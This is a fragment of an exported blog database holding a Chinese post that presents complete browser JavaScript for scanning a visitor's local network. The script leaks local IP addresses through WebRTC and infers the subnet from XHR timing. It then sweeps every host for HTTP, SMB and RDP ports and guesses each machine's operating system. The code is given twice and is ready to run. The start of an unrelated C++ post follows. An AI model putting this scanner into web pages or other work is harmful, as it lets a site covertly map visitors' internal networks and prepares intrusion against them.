{\n\t\t\t\t\tfErrorCallback(&quot;Could not create offer: &quot; + sErrorMessage);\n\t\t\t\t}\n\t\t\t);\n\t\t};\n\t\t///////////////////////////////////////////////////////\n\t\tfunction fXHRScanIPAddressPorts(sIPAddress, auPortNumbers,oTreeNode, fCallback) {\n\t\t\tvar auDetectedPorts = [];\n\t\t\t(function fLoop() {\n\t\t\t\tif(auPortNumbers.length) {\n\t\t\t\t\tvar uPortNumber = auPortNumbers.pop(),\n\t\t\t\t\t\toXHR = new XMLHttpRequest(),\n\t\t\t\t\t\tbFinished = false,\n\t\t\t\t\t\toTimeout = setTimeout(function fXHRTimeout() {\n\t\t\t\t\t\t\tif(!bFinished) {\n\t\t\t\t\t\t\t\tbFinished = true;\n\t\t\t\t\t\t\t\toXHR.abort();\n\t\t\t\t\t\t\t\tfLoop();\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t}, 1500);\n\t\t\t\t\toXHR.onreadystatechange = function fXHRReadyStateChangeEventHandler(oEvent) {\n\t\t\t\t\t\tif(oXHR.readyState == 4 &amp;&amp; !bFinished) {\n\t\t\t\t\t\t\tbFinished = true;\n\t\t\t\t\t\t\tclearTimeout(oTimeout);\n\t\t\t\t\t\t\tauDetectedPorts.push(uPortNumber);\n\t\t\t\t\t\t\tfLoop();\n\t\t\t\t\t\t};\n\t\t\t\t\t};\n\t\t\t\t\toXHR.open(&quot;GET&quot;, location.protocol + &quot;//&quot; + sIPAddress + &quot;:&quot; + uPortNumber);\n\t\t\t\t\toXHR.send();\n\t\t\t\t} else {\n\t\t\t\t//\tconsole.log(&quot;IP: &quot; + sIPAddress + &quot;, ports: &quot; + (auDetectedPorts.join(&quot;, &quot;) || &quot;none&quot;));\n\t\t\t\t\toTreeNode.ports=auDetectedPorts.join(&quot;, &quot;) || null;\n\t\t\t\t\tfCallback(auDetectedPorts);\n\t\t\t\t};\n\t\t\t})();\n\t\t};\n\t\t///////////////////////////////////////////////////\n\t\tfunction fuIPAddress(sIPAddress) {\n\t\t\tvar asComponents = /([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})/.exec(sIPAddress);\n\t\t\tif(!asComponents) throw new TypeError(&quot;Invalid IPv4 address &quot; + sIPAddress);\n\t\t\tvar uIPAddress = 0;\n\t\t\tfor(var uByte = 0; uByte &lt; 4; uByte++) {\n\t\t\t\tuIPAddress = (uIPAddress &lt;&lt; 8) + parseInt(asComponents[uByte + 1]); // no sanity checks!\n\t\t\t};\n\t\t\treturn uIPAddress;\n\t\t};\n\n\t\tfunction fsIPAddress(uIPAddress) {\n\t\t\tvar asIPAddress = [];\n\t\t\tfor(var uByte = 0; uByte &lt; 4; uByte++) {\n\t\t\t\tasIPAddress[uByte] = ((uIPAddress &gt;&gt; (24 - uByte * 8)) &amp; 0xFF).toString();\n\t\t\t};\n\t\t\treturn asIPAddress.join(&quot;.&quot;);\n\t\t};\n\t\t////////////////////////////////////////////\n\n\t\tfunction fScanNetworksForIPAddresses(asIPAddresses, fCallback) {\n\t\t\t(function fScanNetworksForIPAddressesLoop() {\n\t\t\t\tif(asIPAddresses.length != 0) {\n\t\t\t\t\treturn fScanNetwork(asIPAddresses.shift(), fScanNetworksForIPAddressesLoop);\n\t\t\t\t};\n\t\t\t\tfCallback();\n\t\t\t})();\n\t\t};\n\t\tvar oNetworkTreeNode;\n\t\t\n\t\tfunction fScanNetwork(sIPAddress, fCallback) {\n\t\t\toNetworkTreeNode = new cTreeNode(&quot;Determining subnet for &quot; + sIPAddress + &quot;...&quot;, &quot;scanning.svg&quot;),\n\t\t\t\tuIPAddress = fuIPAddress(sIPAddress);\n\t\t\t//root=oNetworkTreeNode.oRootElement;\n\t\t\tfGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, function(uPrefixLength) {\n\t\t\t\toNetworkTreeNode.setName(&quot;Scanning network &quot; + sIPAddress + &quot;/&quot; + uPrefixLength + &quot;...&quot;)\n\t\t\t\tvar uBitMask = -(1 &lt;&lt; (32 - uPrefixLength)),\n\t\t\t\t\tuAllOnes = (1 &lt;&lt; (32 - uPrefixLength)) - 1,\n\t\t\t\t\tuStartIPAddress = uIPAddress &amp; uBitMask,\n\t\t\t\t\tuEndIPAddress = uIPAddress | uAllOnes,\n\t\t\t\t\tuCurrentIPAddress = uStartIPAddress + 1,\n\t\t\t\t\tuScansStarted = 0,\n\t\t\t\t\tuScansFinished = 0;\n\n\t\t\t\tfunction fScanIPAddressThread() {\n\t\t\t\t\tuScansStarted++;\n\t\t\t\t\tif(uCurrentIPAddress != uEndIPAddress) {\n\t\t\t\t\t\tvar sCurrentIPAddress = fsIPAddress(uCurrentIPAddress);\n\t\t\t\t\t\tif(uCurrentIPAddress == uIPAddress) {\n\t\t\t\t\t\t\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress + &quot; (you)&quot;, &quot;machine.svg&quot;));\n\t\t\t\t\t\t\tfScanIPAddress(uCurrentIPAddress++, oTreeNode, fScanIPAddressThread);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress, &quot;scanning.svg&quot;));\n\t\t\t\t\t\t\tfScanIPAddress(uCurrentIPAddress++, oTreeNode, fScanIPAddressThread);\n\t\t\t\t\t\t};\n\t\t\t\t\t\treturn;\n\t\t\t\t\t};\n\t\t\t\t\toNetworkTreeNode.setName(&quot;Network &quot; + sIPAddress + &quot;/&quot; + uPrefixLength)\n\t\t\t\t\toNetworkTreeNode.setIcon(&quot;network.svg&quot;)\n\t\t\t\t\tuScansFinished++;\n\n\t\t\t\t\tif(uScansFinished==64){\n\t\t\t\t\t\tfor(var x in oNetworkTreeNode){\n\t\t\t\t\t\t\tdelete\toNetworkTreeNode[x].parent\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcallback(oNetworkTreeNode);\n\t\t\t\t\t}\n\t\t\t\t\tif(uScansStarted == uScansFinished) {\n\t\t\t\t\t\tfCallback();\n\t\t\t\t\t};\n\t\t\t\t};\n\t\t\t\tfor(var uThreads = 64; uThreads--;) setTimeout(fScanIPAddressThread);\n\t\t\t});\n\t\t};\n\n\t\tfunction fGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, fCallback) {\n\t\t\t// Attempting to make an XHR to the broadcast address will result in an immediate error. Attempting to make an\n\t\t\t// XHR to an unused IP address will result in a time-out. We'll start with a large prefix and try increasingly\n\t\t\t// smaller ones to look for potential broadcast addresses using this timing difference. An IP address can also\n\t\t\t// be in-use by a *nix machine, which will also result in an immediate error. In an attempt to distinguish\n\t\t\t// between these two, try the next smaller prefix as well: if that fails, assume the former prefix is right and\n\t\t\t// return. Obviously this is not perfect, but it seems to work well enough.\n\t\t\tvar uPrefixLength = 26,\n\t\t\t\tbBroadcastAddressMayHaveBeenFound = false,\n\t\t\t\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(&quot;&quot;, &quot;scanning.svg&quot;));\n\t\t\t(function fTestPrefixLength() {\n\t\t\t\tif(uPrefixLength &gt;= 16) {\n\t\t\t\t\tvar uAllOnes = (1 &lt;&lt; (32 - uPrefixLength)) - 1,\n\t\t\t\t\t\tsBroadcastIPAddress = fsIPAddress(uIPAddress | uAllOnes);\n\t\t\t\t\toTreeNode.setName(&quot;Testing potential broadcast address &quot; + sBroadcastIPAddress + &quot; (/&quot; + uPrefixLength + &quot;)...&quot;);\n\t\t\t\t\tfXHRScanIPAddressPorts(sBroadcastIPAddress, [2], oTreeNode,function(auDetectedPortNumbers) {\n\t\t\t\t\t\tif(auDetectedPortNumbers.length &gt; 0) {\n\t\t\t\t\t\t\t// This IP address results in an immediate error. It may be the broadcast address.\n\t\t\t\t\t\t\tif(uPrefixLength == 16) {\n\t\t\t\t\t\t\t\t// We won't try to scan larger networks: use this.\n\t\t\t\t\t\t\t\toTreeNode.remove();\n\t\t\t\t\t\t\t\treturn fCallback(uPrefixLength);\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t\tbBroadcastAddressMayHaveBeenFound = true;\n\t\t\t\t\t\t\t// Try the next: in most setups this should fail if we just found the broadcast address.\n\t\t\t\t\t\t\tuPrefixLength--;\n\t\t\t\t\t\t\treturn fTestPrefixLength();\n\t\t\t\t\t\t};\n\t\t\t\t\t\tif(!bBroadcastAddressMayHaveBeenFound) {\n\t\t\t\t\t\t\t// This IP address is not used, nor was the previously tested one: try the next.\n\t\t\t\t\t\t\tuPrefixLength--;\n\t\t\t\t\t\t\treturn fTestPrefixLength();\n\t\t\t\t\t\t};\n\t\t\t\t\t\t// This IP address is not used, so the previous one is probably the broadcast address.\n\t\t\t\t\t\toTreeNode.remove();\n\t\t\t\t\t\tfCallback(uPrefixLength + 1);\n\t\t\t\t\t});\n\t\t\t\t\treturn;\n\t\t\t\t};\n\t\t\t\toTreeNode.setName(&quot;Could not determine subnet, assuming /24...&quot;);\n\t\t\t\toTreeNode.setIcon(&quot;error.svg&quot;);\n\t\t\t\tfCallback(8);\n\t\t\t})();\n\t\t};\n\n\t\tfunction fScanIPAddress(uIPAddress, oMachineTreeNode, fCallback) {\n\t\t\tvar sIPAddress = fsIPAddress(uIPAddress);\n\t\t\toMachineTreeNode.setName(sIPAddress);\n\t\t\toMachineTreeNode.setIcon(&quot;scanning.svg&quot;);\n\t\t\t// check if machine responds on the SMB/RDP ports, which both Windows and *nix machines might.\n\t\t\t\n\t\t//\tif(ipArr==null){\n\t\t\t\tipArr= [80, 443, 445, 3389]\n\t\t\t//}\n\t\t\t///////////////////////////////////////////////\n\t\t\tfXHRScanIPAddressPorts(sIPAddress, ipArr, oTreeNode,function(auDetectedPortNumbers) {\n\t\t\t\t// no response on this port: assume IP address not in use.\n\t\t\t\tif(auDetectedPortNumbers.length == 0) {\n\t\t\t\t\toMachineTreeNode.remove();\n\t\t\t\t\treturn fCallback();\n\t\t\t\t};\n\t\t\t\t// check if machine responds to other ports that are very unlikely to be in use:\n\t\t\t\tfXHRScanIPAddressPorts(sIPAddress, [2], oTreeNode,function(auDetectedPortNumbers) {\n\t\t\t\t\tif(auDetectedPortNumbers.length &gt; 0) {\n\t\t\t\t\t\t// machine responds to ports that are very unlikely to be in use: probably *nix.\n\t\t\t\t\t\toMachineTreeNode.setIcon(&quot;machine.svg&quot;);\n\t\t\t\t\t\treturn fCallback();\n\t\t\t\t\t};\n\t\t\t\t\t// check again as this is somewhat unreliable:\n\t\t\t\t\tfXHRScanIPAddressPorts(sIPAddress, [3],oTreeNode, function(auDetectedPortNumbers) {\n\t\t\t\t\t\tif(auDetectedPortNumbers.length &gt; 0) {\n\t\t\t\t\t\t\t// machine responds to ports that are very unlikely to be in use: probably *nix.\n\t\t\t\t\t\t\toMachineTreeNode.setIcon(&quot;machine.svg&quot;);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t// machine does not appear to respond to ports that are not in use: probably Windows.\n\t\t\t\t\t\t\toMachineTreeNode.setIcon(&quot;windows.svg&quot;);\n\t\t\t\t\t\t};\n\t\t\t\t\t\tfCallback();\n\t\t\t\t\t});\n\t\t\t\t});\n\t\t\t});\n\t\t};\n\n\t\tfGetIPAddresses(\n\t\t\twindow,\n\t\t\tfunction fGetIPAddressSuccessCallback(asIPAddresses) {\n\t\t\t\tif(asIPAddresses.length == 0) {\n\t\t\t\t\tdocument.body.appendChild(new cTreeNode(&quot;Your local IP address could not be determined.&quot;, &quot;error.svg&quot;).oRootElement);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tfScanNetworksForIPAddresses(asIPAddresses, function() {\n\t\t\t\t\tdocument.title = &quot;Done.&quot;;\n\t\t\t\t\tclearInterval(oInterval);\n\t\t\t\t\tdocument.body.appendChild(new cTreeNode(&quot;Scanning took &quot; + fsGetTime() + &quot;.&quot;, &quot;info.svg&quot;).oRootElement);\n\t\t\t\t\t// done scanning.\n\t\t\t\t});\n\t\t\t},\n\t\t\tfunction fGetIPAddressErrorCallback(sErrorMessage) {\n\t\t\t\tdocument.body.appendChild(new cTreeNode(sErrorMessage, &quot;error.svg&quot;).oRootElement);\n\t\t\t}\n\t\t);\n\t\t}\nrun(function(data){console.log(data)})\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"64","plaintext":"ajax扫描局域网内部主机端口，发送ajax请求到80，或者557等端口。如果立马返回错误，说明端口存活，超时说明没有打开端口。\n\n> 代码如下\n\n\n\t\tfunction run(callback){\n\t\t//////////////////////////////////////////////////////////////\n\t\t///修改\n\t\tfunction cTreeNode(sNodeName, sIconURL) {\n\t\t\tthis.sNodeName=sNodeName;\n\t\t\tthis.sIconURL=sIconURL;\n\t\t\n\t\t};\n\t\tcTreeNode.prototype.setName = function cTreeNode_setName(sNewName) {\n\t\t\tthis.sNodeName = sNewName;\n\t\t};\n\t\tcTreeNode.prototype.setIcon = function cTreeNode_setName(sIconURL) {\n\t\t\tthis.sIconURL=sIconURL;\n\t\t};\n\t\t//var i=0;\n\t\tcTreeNode.prototype.appendChild = function cTreeNode_appendChild(oChildTreeNode) {\n\t\t\t\n\t\t\tthis[oChildTreeNode.sNodeName]=oChildTreeNode;\n\t\t\t//i++;\n\t\t\toChildTreeNode.parent=this;\n\t\t\treturn oChildTreeNode;\n\t\t};\n\t\tcTreeNode.prototype.remove = function cTreeNode_remove() {\n\t\t\t\n\t\t\tfor(var x in this.parent){\n\t\t\t\t\n\t\t\t\tif(this.parent[x]===this){\n\t\t\t\t\tdelete this.parent[x];\n\t\t\t\t}\n\t\t\t}\n\t\t\n\t\t};\n\t\t\n\t\t\n\t\t//////////////////////////////////////////////////////////\n\t\tfunction fGetIPAddresses(oIFrame, fSuccessCallback, fErrorCallback) {\n\t\t\t//<iframe id=\"iframe\" sandbox=\"allow-same-origin\" style=\"display: none\"></iframe>\n\t\t\tfunction fcGetRTCPeerConnection(oWindow) {\n\t\t\t\treturn oWindow && (oWindow.RTCPeerConnection || oWindow.mozRTCPeerConnection || oWindow.webkitRTCPeerConnection);\n\t\t\t}\n\t\t\tvar cRTCPeerConnection = fcGetRTCPeerConnection(window) || fcGetRTCPeerConnection(oIFrame.contentWindow);\n\t\t\tif(!cRTCPeerConnection) {\n\t\t\t\tfErrorCallback(\"RTCPeerConnection feature not available\");\n\t\t\t\treturn;\n\t\t\t};\n\n\t\t\tvar oRTCPeerConnection = new cRTCPeerConnection({\n\t\t\t\t\"iceServers\": [{\n\t\t\t\t\t\"urls\": \"stun:stun.services.mozilla.com\"\n\t\t\t\t}, ]\n\t\t\t}, {\n\t\t\t\t\"optional\": [{\n\t\t\t\t\t\"RtpDataChannels\": true\n\t\t\t\t}, ]\n\t\t\t});\n\n\t\t\tdsIPAddresses = {};\n\t\t\toRTCPeerConnection.onicecandidate = function fRTCPeerConnectionIceEventHandler(oRTCPeerConnectionIceEvent) {\n\t\t\t\tvar oRTCIceCandidate = oRTCPeerConnectionIceEvent.candidate;\n\t\t\t\tif(oRTCIceCandidate) {\n\t\t\t\t\tvar asCandidate = oRTCIceCandidate.candidate.split(\" \");\n\t\t\t\t\tif(asCandidate[7] == \"host\") {\n\t\t\t\t\t\tvar sIPAddress = asCandidate[4];\n\t\t\t\t\t\tif(/[0-9]{1,3}(?:\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7}/.exec(sIPAddress)) {\n\t\t\t\t\t\t\tdsIPAddresses[sIPAddress] = 1;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t//\tconsole.log(\"Ignored RTCIceCandidate \" + JSON.stringify(oRTCIceCandidate.candidate) + \": not an IP address.\");\n\t\t\t\t\t\t};\n\t\t\t\t\t} else {\n\t\t\t\t\t//\tconsole.log(\"Ignored RTCIceCandidate \" + JSON.stringify(oRTCIceCandidate.candidate) + \": not a \\\"host\\\".\");\n\t\t\t\t\t};\n\t\t\t\t} else {\n\t\t\t\t\tfSuccessCallback(Object.keys(dsIPAddresses));\n\t\t\t\t};\n\t\t\t};\n\n\t\t\toRTCPeerConnection.createDataChannel(\"\");\n\t\t\toRTCPeerConnection.createOffer(\n\t\t\t\tfunction fCreateOfferSuccess(oRTCSessionDescription) {\n\t\t\t\t\toRTCPeerConnection.setLocalDescription(\n\t\t\t\t\t\toRTCSessionDescription,\n\t\t\t\t\t\tfunction fSetLocalDescriptionSuccess() {},\n\t\t\t\t\t\tfunction fSetLocalDescriptionError(sErrorMessage) {\n\t\t\t\t\t\t\tfErrorCallback(\"Could not set local description: \" + sErrorMessage);\n\t\t\t\t\t\t}\n\t\t\t\t\t);\n\t\t\t\t},\n\t\t\t\tfunction fCreateOfferError(sErrorMessage) {\n\t\t\t\t\tfErrorCallback(\"Could not create offer: \" + sErrorMessage);\n\t\t\t\t}\n\t\t\t);\n\t\t};\n\t\t///////////////////////////////////////////////////////\n\t\tfunction fXHRScanIPAddressPorts(sIPAddress, auPortNumbers,oTreeNode, fCallback) {\n\t\t\tvar auDetectedPorts = [];\n\t\t\t(function fLoop() {\n\t\t\t\tif(auPortNumbers.length) {\n\t\t\t\t\tvar uPortNumber = auPortNumbers.pop(),\n\t\t\t\t\t\toXHR = new XMLHttpRequest(),\n\t\t\t\t\t\tbFinished = false,\n\t\t\t\t\t\toTimeout = setTimeout(function fXHRTimeout() {\n\t\t\t\t\t\t\tif(!bFinished) {\n\t\t\t\t\t\t\t\tbFinished = true;\n\t\t\t\t\t\t\t\toXHR.abort();\n\t\t\t\t\t\t\t\tfLoop();\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t}, 1500);\n\t\t\t\t\toXHR.onreadystatechange = function fXHRReadyStateChangeEventHandler(oEvent) {\n\t\t\t\t\t\tif(oXHR.readyState == 4 && !bFinished) {\n\t\t\t\t\t\t\tbFinished = true;\n\t\t\t\t\t\t\tclearTimeout(oTimeout);\n\t\t\t\t\t\t\tauDetectedPorts.push(uPortNumber);\n\t\t\t\t\t\t\tfLoop();\n\t\t\t\t\t\t};\n\t\t\t\t\t};\n\t\t\t\t\toXHR.open(\"GET\", location.protocol + \"//\" + sIPAddress + \":\" + uPortNumber);\n\t\t\t\t\toXHR.send();\n\t\t\t\t} else {\n\t\t\t\t//\tconsole.log(\"IP: \" + sIPAddress + \", ports: \" + (auDetectedPorts.join(\", \") || \"none\"));\n\t\t\t\t\toTreeNode.ports=auDetectedPorts.join(\", \") || null;\n\t\t\t\t\tfCallback(auDetectedPorts);\n\t\t\t\t};\n\t\t\t})();\n\t\t};\n\t\t///////////////////////////////////////////////////\n\t\tfunction fuIPAddress(sIPAddress) {\n\t\t\tvar asComponents = /([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})/.exec(sIPAddress);\n\t\t\tif(!asComponents) throw new TypeError(\"Invalid IPv4 address \" + sIPAddress);\n\t\t\tvar uIPAddress = 0;\n\t\t\tfor(var uByte = 0; uByte < 4; uByte++) {\n\t\t\t\tuIPAddress = (uIPAddress << 8) + parseInt(asComponents[uByte + 1]); // no sanity checks!\n\t\t\t};\n\t\t\treturn uIPAddress;\n\t\t};\n\n\t\tfunction fsIPAddress(uIPAddress) {\n\t\t\tvar asIPAddress = [];\n\t\t\tfor(var uByte = 0; uByte < 4; uByte++) {\n\t\t\t\tasIPAddress[uByte] = ((uIPAddress >> (24 - uByte * 8)) & 0xFF).toString();\n\t\t\t};\n\t\t\treturn asIPAddress.join(\".\");\n\t\t};\n\t\t////////////////////////////////////////////\n\n\t\tfunction fScanNetworksForIPAddresses(asIPAddresses, fCallback) {\n\t\t\t(function fScanNetworksForIPAddressesLoop() {\n\t\t\t\tif(asIPAddresses.length != 0) {\n\t\t\t\t\treturn fScanNetwork(asIPAddresses.shift(), fScanNetworksForIPAddressesLoop);\n\t\t\t\t};\n\t\t\t\tfCallback();\n\t\t\t})();\n\t\t};\n\t\tvar oNetworkTreeNode;\n\t\t\n\t\tfunction fScanNetwork(sIPAddress, fCallback) {\n\t\t\toNetworkTreeNode = new cTreeNode(\"Determining subnet for \" + sIPAddress + \"...\", \"scanning.svg\"),\n\t\t\t\tuIPAddress = fuIPAddress(sIPAddress);\n\t\t\t//root=oNetworkTreeNode.oRootElement;\n\t\t\tfGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, function(uPrefixLength) {\n\t\t\t\toNetworkTreeNode.setName(\"Scanning network \" + sIPAddress + \"/\" + uPrefixLength + \"...\")\n\t\t\t\tvar uBitMask = -(1 << (32 - uPrefixLength)),\n\t\t\t\t\tuAllOnes = (1 << (32 - uPrefixLength)) - 1,\n\t\t\t\t\tuStartIPAddress = uIPAddress & uBitMask,\n\t\t\t\t\tuEndIPAddress = uIPAddress | uAllOnes,\n\t\t\t\t\tuCurrentIPAddress = uStartIPAddress + 1,\n\t\t\t\t\tuScansStarted = 0,\n\t\t\t\t\tuScansFinished = 0;\n\n\t\t\t\tfunction fScanIPAddressThread() {\n\t\t\t\t\tuScansStarted++;\n\t\t\t\t\tif(uCurrentIPAddress != uEndIPAddress) {\n\t\t\t\t\t\tvar sCurrentIPAddress = fsIPAddress(uCurrentIPAddress);\n\t\t\t\t\t\tif(uCurrentIPAddress == uIPAddress) {\n\t\t\t\t\t\t\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress + \" (you)\", \"machine.svg\"));\n\t\t\t\t\t\t\tfScanIPAddress(uCurrentIPAddress++, oTreeNode, fScanIPAddressThread);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress, \"scanning.svg\"));\n\t\t\t\t\t\t\tfScanIPAddress(uCurrentIPAddress++, oTreeNode, fScanIPAddressThread);\n\t\t\t\t\t\t};\n\t\t\t\t\t\treturn;\n\t\t\t\t\t};\n\t\t\t\t\toNetworkTreeNode.setName(\"Network \" + sIPAddress + \"/\" + uPrefixLength)\n\t\t\t\t\toNetworkTreeNode.setIcon(\"network.svg\")\n\t\t\t\t\tuScansFinished++;\n\n\t\t\t\t\tif(uScansFinished==64){\n\t\t\t\t\t\tfor(var x in oNetworkTreeNode){\n\t\t\t\t\t\t\tdelete\toNetworkTreeNode[x].parent\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcallback(oNetworkTreeNode);\n\t\t\t\t\t}\n\t\t\t\t\tif(uScansStarted == uScansFinished) {\n\t\t\t\t\t\tfCallback();\n\t\t\t\t\t};\n\t\t\t\t};\n\t\t\t\tfor(var uThreads = 64; uThreads--;) setTimeout(fScanIPAddressThread);\n\t\t\t});\n\t\t};\n\n\t\tfunction fGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, fCallback) {\n\t\t\t// Attempting to make an XHR to the broadcast address will result in an immediate error. Attempting to make an\n\t\t\t// XHR to an unused IP address will result in a time-out. We'll start with a large prefix and try increasingly\n\t\t\t// smaller ones to look for potential broadcast addresses using this timing difference. An IP address can also\n\t\t\t// be in-use by a *nix machine, which will also result in an immediate error. In an attempt to distinguish\n\t\t\t// between these two, try the next smaller prefix as well: if that fails, assume the former prefix is right and\n\t\t\t// return. Obviously this is not perfect, but it seems to work well enough.\n\t\t\tvar uPrefixLength = 26,\n\t\t\t\tbBroadcastAddressMayHaveBeenFound = false,\n\t\t\t\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(\"\", \"scanning.svg\"));\n\t\t\t(function fTestPrefixLength() {\n\t\t\t\tif(uPrefixLength >= 16) {\n\t\t\t\t\tvar uAllOnes = (1 << (32 - uPrefixLength)) - 1,\n\t\t\t\t\t\tsBroadcastIPAddress = fsIPAddress(uIPAddress | uAllOnes);\n\t\t\t\t\toTreeNode.setName(\"Testing potential broadcast address \" + sBroadcastIPAddress + \" (/\" + uPrefixLength + \")...\");\n\t\t\t\t\tfXHRScanIPAddressPorts(sBroadcastIPAddress, [2], oTreeNode,function(auDetectedPortNumbers) {\n\t\t\t\t\t\tif(auDetectedPortNumbers.length > 0) {\n\t\t\t\t\t\t\t// This IP address results in an immediate error. It may be the broadcast address.\n\t\t\t\t\t\t\tif(uPrefixLength == 16) {\n\t\t\t\t\t\t\t\t// We won't try to scan larger networks: use this.\n\t\t\t\t\t\t\t\toTreeNode.remove();\n\t\t\t\t\t\t\t\treturn fCallback(uPrefixLength);\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t\tbBroadcastAddressMayHaveBeenFound = true;\n\t\t\t\t\t\t\t// Try the next: in most setups this should fail if we just found the broadcast address.\n\t\t\t\t\t\t\tuPrefixLength--;\n\t\t\t\t\t\t\treturn fTestPrefixLength();\n\t\t\t\t\t\t};\n\t\t\t\t\t\tif(!bBroadcastAddressMayHaveBeenFound) {\n\t\t\t\t\t\t\t// This IP address is not used, nor was the previously tested one: try the next.\n\t\t\t\t\t\t\tuPrefixLength--;\n\t\t\t\t\t\t\treturn fTestPrefixLength();\n\t\t\t\t\t\t};\n\t\t\t\t\t\t// This IP address is not used, so the previous one is probably the broadcast address.\n\t\t\t\t\t\toTreeNode.remove();\n\t\t\t\t\t\tfCallback(uPrefixLength + 1);\n\t\t\t\t\t});\n\t\t\t\t\treturn;\n\t\t\t\t};\n\t\t\t\toTreeNode.setName(\"Could not determine subnet, assuming /24...\");\n\t\t\t\toTreeNode.setIcon(\"error.svg\");\n\t\t\t\tfCallback(8);\n\t\t\t})();\n\t\t};\n\n\t\tfunction fScanIPAddress(uIPAddress, oMachineTreeNode, fCallback) {\n\t\t\tvar sIPAddress = fsIPAddress(uIPAddress);\n\t\t\toMachineTreeNode.setName(sIPAddress);\n\t\t\toMachineTreeNode.setIcon(\"scanning.svg\");\n\t\t\t// check if machine responds on the SMB/RDP ports, which both Windows and *nix machines might.\n\t\t\t\n\t\t//\tif(ipArr==null){\n\t\t\t\tipArr= [80, 443, 445, 3389]\n\t\t\t//}\n\t\t\t///////////////////////////////////////////////\n\t\t\tfXHRScanIPAddressPorts(sIPAddress, ipArr, oTreeNode,function(auDetectedPortNumbers) {\n\t\t\t\t// no response on this port: assume IP address not in use.\n\t\t\t\tif(auDetectedPortNumbers.length == 0) {\n\t\t\t\t\toMachineTreeNode.remove();\n\t\t\t\t\treturn fCallback();\n\t\t\t\t};\n\t\t\t\t// check if machine responds to other ports that are very unlikely to be in use:\n\t\t\t\tfXHRScanIPAddressPorts(sIPAddress, [2], oTreeNode,function(auDetectedPortNumbers) {\n\t\t\t\t\tif(auDetectedPortNumbers.length > 0) {\n\t\t\t\t\t\t// machine responds to ports that are very unlikely to be in use: probably *nix.\n\t\t\t\t\t\toMachineTreeNode.setIcon(\"machine.svg\");\n\t\t\t\t\t\treturn fCallback();\n\t\t\t\t\t};\n\t\t\t\t\t// check again as this is somewhat unreliable:\n\t\t\t\t\tfXHRScanIPAddressPorts(sIPAddress, [3],oTreeNode, function(auDetectedPortNumbers) {\n\t\t\t\t\t\tif(auDetectedPortNumbers.length > 0) {\n\t\t\t\t\t\t\t// machine responds to ports that are very unlikely to be in use: probably *nix.\n\t\t\t\t\t\t\toMachineTreeNode.setIcon(\"machine.svg\");\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t// machine does not appear to respond to ports that are not in use: probably Windows.\n\t\t\t\t\t\t\toMachineTreeNode.setIcon(\"windows.svg\");\n\t\t\t\t\t\t};\n\t\t\t\t\t\tfCallback();\n\t\t\t\t\t});\n\t\t\t\t});\n\t\t\t});\n\t\t};\n\n\t\tfGetIPAddresses(\n\t\t\twindow,\n\t\t\tfunction fGetIPAddressSuccessCallback(asIPAddresses) {\n\t\t\t\tif(asIPAddresses.length == 0) {\n\t\t\t\t\tdocument.body.appendChild(new cTreeNode(\"Your local IP address could not be determined.\", \"error.svg\").oRootElement);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tfScanNetworksForIPAddresses(asIPAddresses, function() {\n\t\t\t\t\tdocument.title = \"Done.\";\n\t\t\t\t\tclearInterval(oInterval);\n\t\t\t\t\tdocument.body.appendChild(new cTreeNode(\"Scanning took \" + fsGetTime() + \".\", \"info.svg\").oRootElement);\n\t\t\t\t\t// done scanning.\n\t\t\t\t});\n\t\t\t},\n\t\t\tfunction fGetIPAddressErrorCallback(sErrorMessage) {\n\t\t\t\tdocument.body.appendChild(new cTreeNode(sErrorMessage, \"error.svg\").oRootElement);\n\t\t\t}\n\t\t);\n\t\t}\nrun(function(data){console.log(data)})","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-08-17T10:12:17.000Z","created_by":"1","updated_at":"2016-11-30T04:20:03.000Z","updated_by":"1","published_at":"2016-11-30T04:20:03.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2fe","uuid":"06847642-1402-4f0f-ae64-dbab8a2c80be","title":"c++11 int等与string之间的转换","slug":"c-11-string","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"c++11 `<string>`\\n增加了全局函数std::to_string，以及std::stoi/stol/stoll等等函数。\\n```\\nto_string(int val)  //int，float,long等转string\\nint stoi( const std::string& str, size_t *pos = 0, int base = 10 );\\nsize_t string转到的下标，若全部可以转成int，则等于str的大小。\\nbase 就是进制。\\n```\\n> stoi\\n\\n\\n<pre class=\\\"brush:cpp;\\\" >\\n// stoi example\\n#include &lt;iostream&gt;   // std::cout\\n#include &lt;string&gt;     // std::string, std::stoi\\n\\nint main ()\\n{\\n  std::string str_dec = \\\"2001, A Space Odyssey\\\";\\n  std::string str_hex = \\\"40c3\\\";\\n  